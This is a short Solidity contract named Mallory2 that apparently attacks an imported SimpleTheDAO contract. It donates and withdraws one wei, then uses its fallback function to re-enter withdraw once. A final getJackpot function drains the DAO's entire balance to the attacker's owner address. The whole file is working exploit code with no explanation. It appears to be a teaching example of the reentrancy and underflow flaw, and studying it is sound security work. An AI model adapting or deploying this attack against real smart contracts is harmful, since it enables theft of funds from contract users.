pragma solidity 0.4.15;
import './SimpleTheDAO.sol';

contract Mallory2 {
  SimpleTheDAO public dao;
  address owner;
  bool public performAttack = true;

  function Mallory2(SimpleTheDAO addr) {
    owner = msg.sender;
    dao = addr;
  }

  function attack() payable {
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function getJackpot() {
    dao.withdraw(dao.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
  }

  function() payable {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}